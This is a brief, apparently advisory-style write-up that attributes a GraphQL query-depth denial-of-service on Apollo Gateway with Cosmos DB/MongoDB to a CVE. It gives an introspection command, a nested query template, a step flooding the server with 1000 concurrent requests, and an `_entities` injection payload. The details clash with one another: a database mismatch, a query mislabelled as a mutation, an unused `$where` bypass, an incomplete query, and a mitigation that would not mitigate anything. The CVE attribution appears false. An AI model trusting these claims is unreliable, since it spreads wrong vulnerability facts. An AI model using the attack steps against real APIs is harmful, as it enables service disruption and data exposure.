CVE-2024-30255 in Apollo Gateway 4.7.0 + Cosmos DB allows a client to craft a deeply nested GraphQL query where each level maps to a MongoDB `$lookup` operator. The total estimated cost (returned in the `extensions.cost` field) can reach 2^16 operations before execution, triggering MongoDB CPU exhaustion.

Attack chain:
1. Use Clairvoyance to introspect schema.
```
clairvoyance -t http://api.example.com/graphql -o introspection.json
```

2. Generate malicious query with exponential depth:
```
query Malicious($n:Int!) {
  users {
    posts(first:$n) {
      title
      comments(first:$n) {
        body
        likes(first:$n) { ... }
      }
    }
  }
}
Variables: { "n": 16 }
```

3. Parse `extensions.cost.value` ≈ 65536; send 1000 concurrent requests with same variables; MongoDB server CPU hits 99 %.

Bypasses for Apollo Federation:
• Use `@requires` directive to force resolver chaining across subgraphs.
• Mutation injection via `$where` operator bypass:
```
mutation {
  _entities(representations:[{__typename:"User",id:"ObjectId('507f1f77bcf86cd799439011')'"}]) {
    ... on User { role }
  }
}
```

Mitigations:
• Set `cost.enabled = false` in Apollo config.
• Use MongoDB 6.0+ with `maxTimeMS=5000` per query.

